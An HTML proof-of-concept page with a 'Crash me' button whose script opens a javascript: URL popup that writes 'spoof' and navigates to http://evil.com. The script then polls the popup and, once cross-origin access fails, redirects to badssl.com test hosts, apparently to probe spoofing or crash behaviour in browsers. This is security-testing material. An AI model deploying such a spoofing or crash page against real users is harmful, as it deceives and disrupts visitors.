<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Crash me (centered & bigger)</title>
  <style>
    /* center the page content both horizontally and vertically */
    html, body {
      height: 100%;
      margin: 0;
    }
    body {
      display: flex;
      align-items: center;       /* vertical center */
      justify-content: center;   /* horizontal center */
      background: #f3f4f6;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }

    /* style the link so it looks like a big button */
    a.crash-link {
      display: inline-block;
      font-size: 56px;           /* make it big â€” change as needed */
      font-weight: 700;
      text-decoration: none;
      padding: 18px 36px;
      border-radius: 12px;
      background: #ffdddd;
      color: #a00;
      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
      cursor: pointer;
      user-select: none;
    }

    a.crash-link:active { transform: translateY(1px); }
    a.crash-link:hover  { filter: brightness(0.98); }
  </style>
</head>
<body>

  <a href="#" class="crash-link" onclick="f(); return false;">Crash me</a>

  <script>
    // make variables local to avoid polluting global scope
    let w = null;
    let watcher = null;

    function next() {
      // original behavior: replace location of the popup (or main window if desired)
      try {
        if (w && !w.closed) {
          // attempt to redirect the popup
          w.location.replace('https://preloaded-hsts.badssl.com/');
        } else {
          // fallback: if popup already closed, redirect the current page
          window.location.replace('https://wrong.host.badssl.com/');
        }
      } catch (e) {
        // If cross-origin prevents us, at least ensure the interval is cleared
        console.error('next() error:', e);
      }
    }

    function f() {
      // open a new window. This uses a javascript: URL like your original,
      // but note: browsers sometimes block or sanitize `javascript:` URLs.
      w = window.open(
        "javascript:document.write('spoof');location='http://evil.com'",
        "new",
        "width=500,height=500"
      );

      // clear any previous watcher
      if (watcher) {
        clearInterval(watcher);
        watcher = null;
      }

      // poll safely with a small but reasonable interval (not 1ms)
      watcher = setInterval(function () {
        try {
          // accessing w.location.href will throw if popup navigated cross-origin
          // or if the window is closed. That's the original detection mechanism.
          const x = w.location.href;
          // if you want, you can log or inspect x here:
          // console.log('popup href:', x);
        } catch (e) {
          // when access throws, run next() (as in your original PoC)
          clearInterval(watcher);
          watcher = null;
          next();
        }

        // if the popup gets closed by user, stop the watcher
        if (!w || w.closed) {
          clearInterval(watcher);
          watcher = null;
        }
      }, 100); // 100ms is responsive but not wasteful
    }
  </script>
</body>
</html>
